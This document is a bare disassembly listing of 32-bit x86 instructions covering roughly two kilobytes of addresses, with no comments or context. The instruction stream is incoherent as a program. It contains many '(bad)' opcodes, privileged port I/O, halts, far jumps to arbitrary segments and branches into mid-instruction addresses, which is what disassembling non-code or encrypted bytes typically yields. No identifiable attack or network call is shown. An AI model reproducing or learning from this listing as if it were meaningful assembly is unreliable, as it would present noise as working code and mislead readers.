  411693:	push   ebp
  411694:	xor    al,bl
  411696:	in     al,0xa3
  411698:	add    ch,bl
  41169a:	cmp    al,0xa4
  41169c:	gs out 0xe3,eax
  41169f:	mov    ah,0x1e
  4116a1:	ret    0xc197
  4116a4:	lahf   
  4116a5:	mov    eax,0x8be8061e
  4116aa:	pop    eax
  4116ab:	call   0x81ee5f76
  4116b0:	gs pushf 
  4116b2:	enter  0xa9b4,0xd1
  4116b6:	scas   al,BYTE PTR es:[edi]
  4116b7:	js     0x41167e
  4116b9:	clc    
  4116ba:	out    0xc1,eax
  4116bc:	test   DWORD PTR [edi],ecx
  4116be:	popa   
  4116bf:	nop
  4116c0:	pop    gs
  4116c2:	jecxz  0x4116f8
  4116c4:	pop    es
  4116c5:	cmp    ebx,ebx
  4116c7:	pop    ebx
  4116c8:	ja     0x41171d
  4116ca:	jae    0x4116b1
  4116cc:	test   BYTE PTR [edx+eiz*4+0x70],bl
  4116d0:	mov    cl,dh
  4116d2:	std    
  4116d3:	iret   
  4116d4:	(bad)  
  4116d5:	cli    
  4116d6:	cmc    
  4116d7:	in     eax,0x3f
  4116d9:	test   eax,0x1b53b3
  4116de:	jne    0x4116d2
  4116e0:	dec    BYTE PTR [esi+ecx*1-0x67]
  4116e4:	std    
  4116e5:	daa    
  4116e6:	jae    0x41168b
  4116e8:	test   al,0xc1
  4116ea:	loopne 0x41173a
  4116ec:	sti    
  4116ed:	and    al,0x17
  4116ef:	mov    cl,0x5f
  4116f1:	pop    ebp
  4116f2:	add    dh,BYTE PTR [esi+0x1f]
  4116f5:	int3   
  4116f6:	jge    0x4116f9
  4116f8:	mov    ebx,0xf930092c
  4116fd:	sti    
  4116fe:	inc    eax
  4116ff:	mov    bl,0x78
  411701:	sbb    DWORD PTR ds:0x8e1aefae,esp
  411707:	sbb    ebx,DWORD PTR [edi+edi*2]
  41170a:	rol    DWORD PTR [ecx],0xa7
  41170d:	jo     0x41170c
  41170f:	hlt    
  411710:	retf   
  411711:	mov    edi,0xd39c6421
  411716:	je     0x4116e3
  411718:	sar    dh,1
  41171a:	mov    cl,0x12
  41171c:	and    eax,0xf0743012
  411721:	jp     0x41174f
  411723:	inc    edx
  411724:	fs scas al,BYTE PTR es:[edi]
  411726:	mov    ebx,0x9bc03e2a
  41172b:	or     eax,0xb3a6a85
  411730:	(bad)  
  411731:	icebp  
  411732:	rol    DWORD PTR [eax],1
  411734:	ds jge 0x41178c
  411737:	jbe    0x41177b
  411739:	cmp    BYTE PTR [ecx-0x13],cl
  41173c:	dec    edx
  41173d:	jl     0x41178a
  41173f:	xchg   edi,eax
  411740:	adc    esp,DWORD PTR [eax]
  411742:	jl     0x41178c
  411744:	scas   eax,DWORD PTR es:[edi]
  411745:	dec    ebx
  411746:	enter  0x499e,0xab
  41174a:	ds ret 
  41174c:	pop    ebx
  41174d:	dec    edi
  41174e:	rcr    BYTE PTR [edx],1
  411750:	loope  0x411713
  411752:	or     ah,BYTE PTR [esi-0x1f]
  411755:	dec    ebp
  411756:	xchg   ebp,eax
  411757:	xchg   ebx,eax
  411758:	aad    0x98
  41175a:	ret    0x625b
  41175d:	mov    eax,DWORD PTR ds:0x2c7e62a9
  411763:	and    al,0x42
  411765:	adc    dl,BYTE PTR [ebp+ecx*4-0x15]
  411769:	jl     0x4117ca
  41176b:	inc    DWORD PTR [edi-0x4241b1d1]
  411771:	pop    ebx
  411772:	lods   al,BYTE PTR ds:[esi]
  411773:	mov    ecx,DWORD PTR [eax-0x10]
  411776:	push   0xc43eb24b
  41177b:	dec    edi
  41177c:	xlat   BYTE PTR ds:[ebx]
  41177d:	push   cs
  41177e:	inc    edi
  41177f:	inc    esi
  411780:	jns    0x411706
  411782:	xor    edx,edx
  411784:	shl    DWORD PTR [ebx+0x777177ef],0xc3
  41178b:	lods   al,BYTE PTR ds:[esi]
  41178c:	pushf  
  41178d:	sbb    edx,edx
  41178f:	sbb    al,0x2d
  411791:	jbe    0x4117af
  411793:	cli    
  411794:	in     eax,dx
  411795:	pop    eax
  411796:	xchg   edi,eax
  411797:	sbb    esi,DWORD PTR [ebx-0x4e4cc554]
  41179d:	pusha  
  41179e:	mov    al,0x51
  4117a0:	dec    edx
  4117a1:	neg    DWORD PTR [edi]
  4117a3:	(bad)  
  4117a4:	fiadd  DWORD PTR [edi-0x32]
  4117a7:	outs   dx,DWORD PTR ds:[esi]
  4117a8:	sbb    BYTE PTR [ebx+0x2027a8e2],cl
  4117ae:	fstp   TBYTE PTR [ecx-0x37697a47]
  4117b4:	and    ecx,DWORD PTR [eax+0x6f9a711f]
  4117ba:	mov    eax,0xac6b6a63
  4117bf:	mov    ecx,0x562e1e36
  4117c4:	pop    ss
  4117c5:	jmp    0x4e91:0x35c295d3
  4117cc:	out    dx,al
  4117cd:	pop    ecx
  4117ce:	push   ecx
  4117cf:	jl     0x411812
  4117d1:	mov    dh,0x3d
  4117d3:	sub    dl,BYTE PTR [esi+0x7c544b7]
  4117d9:	dec    ebp
  4117da:	jb     0x411798
  4117dc:	jne    0x411809
  4117de:	and    ah,BYTE PTR [ebp+0x21]
  4117e1:	and    ah,BYTE PTR [esi+eiz*8-0x644d14f4]
  4117e8:	daa    
  4117e9:	or     DWORD PTR [esi+eax*2+0x16],edx
  4117ed:	push   esi
  4117ee:	icebp  
  4117ef:	cld    
  4117f0:	ffreep st(2)
  4117f2:	adc    esi,DWORD PTR [edi-0xb]
  4117f5:	hlt    
  4117f6:	add    cl,0x57
  4117f9:	outs   dx,BYTE PTR ds:[esi]
  4117fa:	fstp   DWORD PTR [ecx-0x7af1ca2d]
  411800:	xlat   BYTE PTR ds:[ebx]
  411801:	in     eax,0x60
  411803:	fld    QWORD PTR [ebx-0x34e6f715]
  411809:	add    DWORD PTR [esi+0x6a37a5ec],edi
  41180f:	out    dx,eax
  411810:	xchg   ecx,eax
  411811:	pop    ecx
  411812:	dec    bp
  411814:	scas   eax,DWORD PTR es:[edi]
  411815:	mov    eax,0x917580ab
  41181a:	mov    bl,BYTE PTR [eax+0x35cd798d]
  411820:	jb     0x41189c
  411822:	add    al,0xb7
  411824:	stc    
  411825:	or     DWORD PTR [esi-0x70ee333c],edi
  41182b:	adc    al,0x70
  41182d:	or     eax,0xc8aefab1
  411832:	pop    esp
  411833:	and    ah,ch
  411835:	push   edx
  411836:	mov    esp,0x38505729
  41183b:	push   ecx
  41183c:	js     0x411810
  41183e:	sbb    eax,0x69990f8c
  411843:	lods   eax,DWORD PTR ds:[esi]
  411844:	cs popa 
  411846:	push   ebx
  411847:	push   es
  411848:	mov    bl,0x60
  41184a:	jle    0x41186b
  41184c:	or     DWORD PTR [ecx-0x34],eax
  41184f:	sub    bl,dl
  411851:	mov    ebp,0xbe7cf515
  411856:	div    DWORD PTR [eax]
  411858:	arpl   ax,dx
  41185a:	clc    
  41185b:	scas   eax,DWORD PTR es:[edi]
  41185c:	pop    ebp
  41185d:	or     BYTE PTR [edi-0x32],0xcf
  411861:	or     ecx,DWORD PTR [ebx+0x3c]
  411864:	repz mov al,0x6e
  411867:	dec    edi
  411868:	xchg   ecx,eax
  411869:	cdq    
  41186a:	pop    ss
  41186b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41186c:	jg     0x411880
  41186e:	cli    
  41186f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411870:	jmp    0x411899
  411872:	dec    edi
  411873:	lock mov dh,0x36
  411876:	std    
  411877:	imul   esi,DWORD PTR ds:0x358f29ac,0xffffffac
  41187e:	pop    esi
  41187f:	pop    es
  411880:	adc    cl,BYTE PTR [eax+0x7167ff21]
  411886:	mov    eax,ds:0xbeb0e556
  41188b:	inc    ebp
  41188c:	cli    
  41188d:	or     eax,0x6a2376d4
  411892:	inc    edi
  411893:	lods   al,BYTE PTR ds:[esi]
  411894:	add    BYTE PTR [eax+eax*1-0x4422ac3d],ah
  41189b:	sbb    eax,0x1587385e
  4118a0:	sub    bl,bl
  4118a2:	adc    ebp,DWORD PTR ds:0xd98c8fc0
  4118a8:	sbb    al,0x9d
  4118aa:	adc    edi,esp
  4118ac:	xchg   esp,eax
  4118ad:	imul   ecx,DWORD PTR [ebp+0x6b3647f1],0xdbf25305
  4118b7:	js     0x411916
  4118b9:	pop    es
  4118ba:	push   0x4a85145d
  4118bf:	loope  0x411856
  4118c1:	push   ebp
  4118c2:	inc    edx
  4118c3:	jle    0x41185f
  4118c5:	les    ecx,FWORD PTR [edx+0x24]
  4118c8:	lods   al,BYTE PTR ds:[esi]
  4118c9:	xchg   esi,eax
  4118ca:	jnp    0x4118bf
  4118cc:	sub    BYTE PTR [edi],bh
  4118ce:	mov    edi,0x31d43086
  4118d3:	rol    eax,1
  4118d5:	push   0xffffffb4
  4118d7:	ffreep st(2)
  4118d9:	mov    dh,0x4e
  4118db:	sar    BYTE PTR [edi+edi*1+0x442e58b2],1
  4118e2:	mov    al,0x2c
  4118e4:	inc    ebp
  4118e5:	xchg   esi,eax
  4118e6:	repz fs inc eax
  4118e9:	push   eax
  4118ea:	ins    DWORD PTR es:[edi],dx
  4118eb:	and    DWORD PTR [esi],0xffffff8b
  4118ee:	(bad)  
  4118ef:	ss mov dl,0x9a
  4118f2:	adc    BYTE PTR [ecx-0x16b3d6ec],al
  4118f8:	mov    eax,ds:0x38eb423c
  4118fd:	rcl    DWORD PTR [edx-0xf86dd15],cl
  411903:	jge    0x411971
  411905:	jo     0x411966
  411907:	fsub   st(1),st
  411909:	mov    edx,DWORD PTR [esi+esi*8]
  41190c:	out    dx,eax
  41190d:	push   ebx
  41190e:	fidivr WORD PTR [esi-0x6f]
  411911:	and    al,0xe
  411913:	fcmovnu st,st(7)
  411915:	sbb    dh,al
  411917:	imul   esi,DWORD PTR [esi+0x13],0x8cd40a69
  41191e:	popa   
  41191f:	xchg   DWORD PTR [edi-0x79],ebx
  411922:	dec    ecx
  411923:	sub    BYTE PTR [ecx+ebx*8+0x7a],dl
  411927:	and    BYTE PTR [ebp+ebx*4-0x755d3864],ah
  41192e:	mov    WORD PTR [ebp-0x6d09542],cs
  411934:	jle    0x4118bc
  411936:	sbb    DWORD PTR [esi-0x2e],ebx
  411939:	into   
  41193a:	arpl   WORD PTR [edx-0x13],dx
  41193d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41193e:	fwait
  41193f:	imul   edi,DWORD PTR [ecx],0xfffffff2
  411942:	jmp    0x1250:0x8f693b23
  411949:	xchg   edi,eax
  41194a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41194b:	xor    esp,DWORD PTR [edx-0xb]
  41194e:	addr16 pushf 
  411950:	in     eax,dx
  411951:	cmp    BYTE PTR [edx-0x2e668873],dh
  411957:	adc    al,0x40
  411959:	shr    DWORD PTR [eax],0xd3
  41195c:	loopne 0x4119a1
  41195e:	push   ds
  41195f:	or     BYTE PTR [edx+edx*4],cl
  411962:	add    bl,cl
  411964:	loope  0x411981
  411966:	fstp   TBYTE PTR [esi+0xe]
  411969:	int3   
  41196a:	add    eax,0xc0c99565
  41196f:	int3   
  411970:	jmp    FWORD PTR [esi+ebx*4+0x2]
  411974:	inc    eax
  411975:	(bad)  
  411976:	cmp    ecx,DWORD PTR [ecx+0x6b]
  411979:	inc    edi
  41197a:	js     0x41191d
  41197c:	jno    0x411991
  41197e:	inc    esp
  41197f:	mov    ds:0x80ffbfd4,eax
  411984:	sub    dl,BYTE PTR [edi+0x55]
  411987:	in     al,0xc9
  411989:	push   es
  41198a:	mov    esi,0x1c7f4bc0
  41198f:	test   esi,ebp
  411991:	mov    ds:0x4a128d41,al
  411996:	dec    edx
  411997:	xor    esp,DWORD PTR [ecx-0x17]
  41199a:	xchg   dl,ch
  41199c:	pushf  
  41199d:	mov    ah,0x2d
  41199f:	hlt    
  4119a0:	cmp    ebp,DWORD PTR [ebx]
  4119a2:	mov    ah,0x69
  4119a4:	into   
  4119a5:	xlat   BYTE PTR ds:[ebx]
  4119a6:	std    
  4119a7:	mov    BYTE PTR [ecx+0x57],bl
  4119aa:	sbb    eax,DWORD PTR [esp+ebx*1+0x5d]
  4119ae:	nop
  4119af:	ja     0x411988
  4119b1:	and    bh,cl
  4119b3:	js     0x4119c0
  4119b5:	xchg   esp,eax
  4119b6:	int3   
  4119b7:	sub    al,0x41
  4119b9:	daa    
  4119ba:	fcompp 
  4119bc:	repnz fdiv st,st(6)
  4119bf:	cmp    al,0xf1
  4119c1:	inc    ecx
  4119c2:	daa    
  4119c3:	mov    eax,ds:0x10948ab
  4119c8:	xchg   ebx,eax
  4119c9:	pop    ds
  4119ca:	adc    BYTE PTR [eax],dl
  4119cc:	je     0x411a13
  4119ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119cf:	nop
  4119d0:	mov    cl,0x2b
  4119d2:	mov    dl,BYTE PTR [esi]
  4119d4:	scas   al,BYTE PTR es:[edi]
  4119d5:	imul   edi,DWORD PTR [edx+0x13],0xffffffcf
  4119d9:	scas   al,BYTE PTR es:[edi]
  4119da:	pusha  
  4119db:	test   eax,0x8f4de5d
  4119e0:	cmc    
  4119e1:	test   DWORD PTR [edi+0x2dd0b451],edx
  4119e7:	jle    0x4119ef
  4119e9:	loop   0x411a49
  4119eb:	(bad)  
  4119ec:	adc    esi,esp
  4119ee:	mov    esp,0x6d44024b
  4119f3:	cmp    ebx,DWORD PTR [eax+ebx*8-0x2af6258c]
  4119fa:	and    edx,DWORD PTR ds:0xcb8cbe75
  411a00:	fdivr  QWORD PTR ds:0xae6d4079
  411a06:	cmp    eax,0x452c507
  411a0b:	sub    al,BYTE PTR [ecx+0x69a50d3]
  411a11:	adc    BYTE PTR [ecx*1-0x4d2b2b97],al
  411a18:	ins    BYTE PTR es:[edi],dx
  411a19:	(bad)  
  411a1a:	sub    BYTE PTR [edx+esi*8+0x32],ch
  411a1e:	mov    esp,0x4c2a6492
  411a23:	and    BYTE PTR ds:0x13cf317c,ah
  411a29:	mov    DWORD PTR [ecx+0x22],edx
  411a2c:	push   cs
  411a2d:	ds shr ecx,0x2f
  411a31:	lea    ecx,[ebx]
  411a33:	inc    esi
  411a34:	in     al,0xde
  411a36:	mov    cl,bh
  411a38:	clc    
  411a39:	fld    DWORD PTR [ecx-0x688f446b]
  411a3f:	ret    0xb31d
  411a42:	or     ebp,esp
  411a44:	xor    bl,0xb9
  411a47:	adc    BYTE PTR [esp+ebp*8],al
  411a4a:	jo     0x411aba
  411a4c:	pop    DWORD PTR [edi+0xaa9f7e8]
  411a52:	fwait
  411a53:	and    dh,dl
  411a55:	out    dx,al
  411a56:	(bad)  
  411a57:	test   BYTE PTR [eax-0x33],ah
  411a5a:	jbe    0x411abb
  411a5c:	cli    
  411a5d:	mov    ah,0x4e
  411a5f:	or     ecx,DWORD PTR [esi]
  411a61:	xchg   esi,eax
  411a62:	pop    ebx
  411a63:	or     cl,BYTE PTR [ecx+0x13e44247]
  411a69:	dec    ebx
  411a6a:	(bad)  
  411a6b:	mov    BYTE PTR [ebx],ah
  411a6d:	jno    0x411a0b
  411a6f:	clc    
  411a70:	fs push ss
  411a72:	inc    ebx
  411a73:	xchg   BYTE PTR [ebp+0x45c80bd],al
  411a79:	inc    ebp
  411a7a:	popf   
  411a7b:	pushf  
  411a7c:	into   
  411a7d:	rol    bl,cl
  411a7f:	xchg   esi,eax
  411a80:	sbb    DWORD PTR [ecx-0x7a440c3f],esi
  411a86:	jnp    0x411a42
  411a88:	out    0xdf,eax
  411a8a:	test   eax,0xeb8a6395
  411a8f:	xor    eax,0xccb008
  411a94:	push   0x8fa045c5
  411a99:	arpl   WORD PTR [edx-0x5e],ax
  411a9c:	out    dx,eax
  411a9d:	cmp    eax,0x3bf4962
  411aa2:	push   0xc06bb391
  411aa7:	xchg   edi,eax
  411aa8:	call   0xd542:0x1fb29260
  411aaf:	xchg   BYTE PTR [ebp-0x4beafda9],dh
  411ab5:	inc    ebx
  411ab6:	jno    0x411aa8
  411ab8:	xlat   BYTE PTR ds:[ebx]
  411ab9:	xchg   BYTE PTR [ecx-0x32],dh
  411abc:	in     eax,0x76
  411abe:	jl     0x411a41
  411ac0:	aam    0xc8
  411ac2:	push   ebx
  411ac3:	jno    0x411a58
  411ac5:	(bad)  [ebx+0x35]
  411ac8:	pop    esp
  411ac9:	sar    dh,0xaa
  411acc:	not    DWORD PTR [edx+0x39]
  411acf:	mov    BYTE PTR [edx+0xc],ah
  411ad2:	adc    edi,edi
  411ad4:	pop    ecx
  411ad5:	fidivr DWORD PTR [esi+edx*4]
  411ad8:	jmp    0x690c:0xae027362
  411adf:	mov    ah,0x9
  411ae1:	mov    WORD PTR [ebx],gs
  411ae3:	cdq    
  411ae4:	pop    ecx
  411ae5:	loop   0x411a72
  411ae7:	inc    esp
  411ae8:	hlt    
  411ae9:	pop    ebx
  411aea:	pop    esp
  411aeb:	std    
  411aec:	lahf   
  411aed:	clc    
  411aee:	cdq    
  411aef:	nop
  411af0:	test   bh,bh
  411af2:	fsubr  DWORD PTR [ebp+0x40d70ce1]
  411af8:	push   edx
  411af9:	jae    0x411aab
  411afb:	mov    edx,0xaab5e739
  411b00:	fwait
  411b01:	mov    ebp,0xbfb83b53
  411b06:	mov    al,dh
  411b08:	push   edi
  411b09:	(bad)  
  411b0a:	jmp    0x8f534c7b
  411b0f:	lea    edx,ds:0x3de987f5
  411b15:	(bad)  
  411b16:	push   0xffffffb1
  411b18:	ror    BYTE PTR [eax],0xae
  411b1b:	adc    dl,BYTE PTR [eax-0x273d7cde]
  411b21:	jg     0x411ade
  411b23:	out    dx,al
  411b24:	inc    ebx
  411b25:	data16 sbb BYTE PTR [ecx],bh
  411b28:	and    eax,DWORD PTR [edi-0x19]
  411b2b:	push   0x427cb0a5
  411b30:	dec    esp
  411b31:	lods   al,BYTE PTR ds:[esi]
  411b32:	es fs test ecx,0xd2547088
  411b3a:	xchg   DWORD PTR [ebx],edi
  411b3c:	iret   
  411b3d:	popa   
  411b3e:	fbstp  TBYTE PTR [edx]
  411b40:	sbb    cl,BYTE PTR [edi]
  411b42:	ins    BYTE PTR es:[edi],dx
  411b43:	loopne 0x411af3
  411b45:	xor    al,0xef
  411b47:	xchg   esi,eax
  411b48:	out    dx,eax
  411b49:	pop    ebp
  411b4a:	pop    ecx
  411b4b:	rcl    BYTE PTR [esi+0x78c206c],0x65
  411b52:	jge    0x411aeb
  411b54:	cmp    eax,0xc0d199c1
  411b59:	add    bl,BYTE PTR [edx-0x5c]
  411b5c:	jae    0x411b5f
  411b5e:	lods   eax,DWORD PTR ds:[esi]
  411b5f:	cli    
  411b60:	dec    ecx
  411b61:	imul   ebp,edi,0xeda82078
  411b67:	mov    cl,0x99
  411b69:	sub    BYTE PTR [ecx+0x0],dh
  411b6c:	push   es
  411b6d:	jno    0x411b42
  411b6f:	addr16 mov al,0x41
  411b72:	(bad)  
  411b73:	repz mov dh,0x3c
  411b76:	js     0x411bdc
  411b78:	adc    eax,0xc7a7fc35
  411b7d:	push   ecx
  411b7e:	test   DWORD PTR [ebx],ecx
  411b80:	test   DWORD PTR [esi-0x549ba04a],esi
  411b86:	outs   dx,DWORD PTR ds:[esi]
  411b87:	mov    dl,0xe7
  411b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b8a:	dec    edx
  411b8b:	sbb    eax,0x62c0f4e1
  411b90:	push   es
  411b91:	xor    al,0xb4
  411b93:	jne    0x411be8
  411b95:	sub    BYTE PTR [ecx],0x8b
  411b98:	aad    0x8b
  411b9a:	in     al,0x4d
  411b9c:	jg     0x411be8
  411b9e:	mov    ecx,0xb4c532e9
  411ba3:	lds    esp,FWORD PTR [eax]
  411ba5:	fist   DWORD PTR [ecx-0x4efba697]
  411bab:	push   0x7a4e3b50
  411bb0:	jp     0x411b73
  411bb2:	(bad)  
  411bb3:	adc    DWORD PTR [edx],eax
  411bb5:	cmp    esi,edi
  411bb7:	daa    
  411bb8:	sar    DWORD PTR [edi+0x68],cl
  411bbb:	mov    ?,WORD PTR [edx]
  411bbd:	mov    BYTE PTR [edi+0x539153af],dh
  411bc3:	add    DWORD PTR [ebx+0x4e],esp
  411bc6:	iret   
  411bc7:	pop    eax
  411bc8:	popa   
  411bc9:	and    DWORD PTR [eax-0x14924a67],esi
  411bcf:	sub    ebp,edx
  411bd1:	into   
  411bd2:	daa    
  411bd3:	popa   
  411bd4:	imul   ebp,DWORD PTR [edi-0x58d06c47],0x68
  411bdb:	sbb    DWORD PTR [esi+0x329d6a4a],0xffffffdf
  411be2:	(bad)  
  411be3:	aam    0x59
  411be5:	mov    esp,0x66d3d356
  411bea:	ins    BYTE PTR es:[edi],dx
  411beb:	add    al,0x52
  411bed:	adc    DWORD PTR [ebx+ebp*8],ebx
  411bf0:	dec    ebp
  411bf1:	pop    ebx
  411bf2:	(bad)  
  411bf3:	int3   
  411bf4:	sti    
  411bf5:	push   edx
  411bf6:	lea    ebp,[ebx]
  411bf8:	les    esp,FWORD PTR [esi]
  411bfa:	jp     0x411c12
  411bfc:	retf   
  411bfd:	adc    dl,ah
  411bff:	arpl   WORD PTR [edi+0x39fa573a],cx
  411c05:	xor    eax,0xed74e1c1
  411c0a:	in     al,0x8
  411c0c:	mov    al,BYTE PTR [edx-0x53b1eb4d]
  411c12:	jge    0x411ba0
  411c14:	sbb    al,0x2b
  411c16:	jg     0x411bcc
  411c18:	inc    ebx
  411c19:	ffree  st(1)
  411c1b:	out    0xb8,eax
  411c1d:	add    al,0xd6
  411c1f:	into   
  411c20:	imul   ecx,DWORD PTR [edi],0xffffffdc
  411c23:	and    BYTE PTR [eax-0xf],bh
  411c26:	xchg   edi,eax
  411c27:	mov    al,ds:0x6b041ab3
  411c2c:	add    BYTE PTR [ecx],ah
  411c2e:	mov    ecx,0x323550f3
  411c33:	xor    eax,esp
  411c35:	iret   
  411c36:	cdq    
  411c37:	std    
  411c38:	inc    esi
  411c39:	es inc eax
  411c3b:	sub    cl,BYTE PTR [ecx+0x20d6318f]
  411c41:	out    0x2b,eax
  411c43:	mov    cl,0x2c
  411c45:	push   ds
  411c46:	mov    al,ds:0x862a37f5
  411c4b:	pop    ecx
  411c4c:	or     BYTE PTR [edx],bl
  411c4e:	iret   
  411c4f:	mov    bh,0xf9
  411c51:	adc    bl,BYTE PTR [eax-0x7c]
  411c54:	(bad)  
  411c55:	jge    0x411c0c
  411c57:	push   esp
  411c58:	jecxz  0x411cd4
  411c5a:	mov    esi,0x9cc99395
  411c5f:	add    DWORD PTR [eax+0x1e392b2a],0xffffffe0
  411c66:	div    DWORD PTR [ecx-0x25]
  411c69:	jl     0x411c67
  411c6b:	aaa    
  411c6c:	adc    edi,edx
  411c6e:	jne    0x411cbe
  411c70:	cmp    al,ch
  411c72:	call   0xcaa2eb1a
  411c77:	cmp    ebp,edx
  411c79:	jne    0x411c42
  411c7b:	lods   al,BYTE PTR ds:[esi]
  411c7c:	in     eax,dx
  411c7d:	inc    ebx
  411c7e:	mov    ds:0xde12b33f,al
  411c83:	out    dx,al
  411c84:	fs dec edi
  411c86:	outs   dx,BYTE PTR ds:[esi]
  411c87:	stos   BYTE PTR es:[edi],al
  411c88:	ds je  0x411ce0
  411c8b:	xchg   DWORD PTR [edx+0x7a],ebp
  411c8e:	push   edx
  411c8f:	and    eax,0x1d88e763
  411c94:	cmp    ch,BYTE PTR [edi+0x52c2af6b]
  411c9a:	arpl   WORD PTR [esp+ecx*8-0x80],dx
  411c9e:	xchg   BYTE PTR [eax-0xc7a6bc9],dh
  411ca4:	add    al,0x58
  411ca6:	mov    edx,0x9a588fb
  411cab:	sub    BYTE PTR [esi-0x4558cc3b],dh
  411cb1:	inc    ebp
  411cb2:	(bad)  
  411cb3:	int3   
  411cb4:	xor    bh,ch
  411cb6:	mov    ds:0xb806a954,eax
  411cbb:	sbb    eax,0xb0772805
  411cc0:	nop
  411cc1:	jmp    0x87574236
  411cc6:	inc    ecx
  411cc7:	jb     0x411d45
  411cc9:	mov    ebp,0xaa99ff43
  411cce:	adc    esi,DWORD PTR [ecx]
  411cd0:	mov    ah,0xbd
  411cd2:	mov    edx,0x86de949c
  411cd7:	add    esi,esp
  411cd9:	loop   0x411cf3
  411cdb:	outs   dx,BYTE PTR ds:[esi]
  411cdc:	out    dx,al
  411cdd:	ja     0x411cc5
  411cdf:	jno    0x411cf1
  411ce1:	sub    DWORD PTR [edx+eiz*2+0xdec6936],eax
  411ce8:	xchg   edx,eax
  411ce9:	and    BYTE PTR [eax-0x26],0x60
  411ced:	cs cli 
  411cef:	(bad)  
  411cf0:	lea    ebp,[esi]
  411cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cf3:	out    dx,al
  411cf4:	jmp    0x411d21
  411cf6:	scas   al,BYTE PTR es:[edi]
  411cf7:	int3   
  411cf8:	jbe    0x411cf9
  411cfa:	pop    ecx
  411cfb:	push   cs
  411cfc:	jl     0x411ca0
  411cfe:	cmp    al,0x34
  411d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d01:	sbb    eax,0xeda38885
  411d06:	pushf  
  411d07:	call   0x4bf7f004
  411d0c:	rcr    DWORD PTR [ebx-0x35],cl
  411d0f:	mov    ebp,0x1587a012
  411d14:	mov    ds:0xc329991d,al
  411d19:	lahf   
  411d1a:	mov    es,WORD PTR [edx]
  411d1c:	jecxz  0x411d1f
  411d1e:	sbb    DWORD PTR [edi-0x3eedd9ec],edi
  411d24:	les    ebp,FWORD PTR [ebx+ebx*2-0x3e95a192]
  411d2b:	icebp  
  411d2c:	cmp    esi,DWORD PTR [edx+0x2331c9d5]
  411d32:	pop    esi
  411d33:	adc    BYTE PTR [ebx-0x49],ah
  411d36:	stos   BYTE PTR es:[edi],al
  411d37:	pop    edi
  411d38:	jge    0x411d0d
  411d3a:	push   ds
  411d3b:	sahf   
  411d3c:	je     0x411d0c
  411d3e:	cmp    eax,edx
  411d40:	std    
  411d41:	or     BYTE PTR [eax+ebp*2],dl
  411d44:	adc    BYTE PTR [ebx],bh
  411d46:	xor    edx,ebp
  411d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d49:	stos   BYTE PTR es:[edi],al
  411d4a:	cdq    
  411d4b:	jp     0x411d15
  411d4d:	icebp  
  411d4e:	in     al,dx
  411d4f:	mov    esi,0x960bedcb
  411d54:	(bad)  
  411d56:	icebp  
  411d57:	sahf   
  411d58:	lods   eax,DWORD PTR ds:[esi]
  411d59:	xchg   ecx,eax
  411d5a:	adc    DWORD PTR [esi+ebx*2],esp
  411d5d:	hlt    
  411d5e:	pop    esp
  411d5f:	out    dx,eax
  411d60:	mov    dl,0x91
  411d62:	mov    edi,ebp
  411d64:	jmp    0xdfbb:0x55c0ed58
  411d6b:	aad    0x35
  411d6d:	adc    bh,dl
  411d6f:	jge    0x411d3c
  411d71:	push   es
  411d72:	jmp    0xa92b:0x19cd1cb
  411d79:	jl     0x411dd2
  411d7b:	mov    BYTE PTR [esi+ecx*4],ah
  411d7e:	repz jne 0x411ddc
  411d81:	or     DWORD PTR [edi+0xe],ecx
  411d84:	leave  
  411d85:	imul   edi,DWORD PTR [edi+ebp*1],0x490f0b70
  411d8c:	aad    0x50
  411d8e:	pusha  
  411d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d90:	frstor [edx+0x65870248]
  411d96:	mov    ebx,ebp
  411d98:	and    eax,0x36fad887
  411d9d:	push   ebx
  411d9e:	mov    al,0x6d
  411da0:	imul   eax,DWORD PTR [edi+0x28],0x31
  411da4:	sub    al,0x2
  411da6:	and    DWORD PTR [edi+edi*8-0x8],edi
  411daa:	aaa    
  411dab:	xchg   ebp,eax
  411dac:	jge    0x411d3c
  411dae:	push   esp
  411daf:	ret    
  411db0:	or     al,0xd6
  411db2:	push   0x26ee640f
  411db7:	push   0xf4cb88a6
  411dbc:	dec    edi
  411dbd:	pushf  
  411dbe:	add    ebp,DWORD PTR [ebx-0x3c]
  411dc1:	ds fwait
  411dc3:	sub    DWORD PTR [ecx+edi*8],edx
  411dc6:	inc    eax
  411dc7:	sahf   
  411dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dc9:	mov    ss,WORD PTR [edi+edi*2+0xda17164]
  411dd0:	add    eax,0xdbf7c127
  411dd5:	jb     0x411d8e
  411dd7:	mov    bh,0x4
  411dd9:	sub    eax,0x3a248072
  411dde:	test   DWORD PTR [eax],0xa42d5a9d
  411de4:	test   eax,0x838960f0
  411de9:	fldcw  WORD PTR [edx-0x2dc1a95c]
  411def:	cli    
  411df0:	test   DWORD PTR [edx],esp
  411df2:	or     ebp,DWORD PTR [eax+ecx*2]
  411df5:	inc    esp
  411df6:	imul   edx,eax,0xb5dd294e
  411dfc:	js     0x411da0
  411dfe:	icebp  
  411dff:	test   BYTE PTR [edi+0x3d],bl
  411e02:	test   BYTE PTR [edi],dh
  411e04:	in     al,0xdf
  411e06:	idiv   al
  411e08:	stos   BYTE PTR es:[edi],al
  411e09:	loop   0x411e49
  411e0b:	jne    0x411e0a
  411e0d:	cs js  0x411d9c
  411e10:	dec    ecx
  411e11:	and    bh,BYTE PTR [ebx+0x3e]
  411e14:	sub    dh,bl
  411e16:	shl    BYTE PTR [eax-0x77],cl
  411e19:	(bad)
  411e1c:	sub    al,0x3c
  411e1e:	mov    DWORD PTR [ecx],esp
  411e20:	pushf  
  411e21:	xchg   edx,eax
  411e22:	repz xor DWORD PTR [ebx],esi
  411e25:	iret   
  411e26:	sub    eax,0xbbe2ee9c
  411e2b:	mov    ebx,0x84ad9f3a
  411e30:	pop    ss
  411e31:	sub    al,0x9f
  411e33:	add    ch,BYTE PTR [ecx+0x53]
  411e36:	ja     0x411dcc
  411e38:	(bad)  
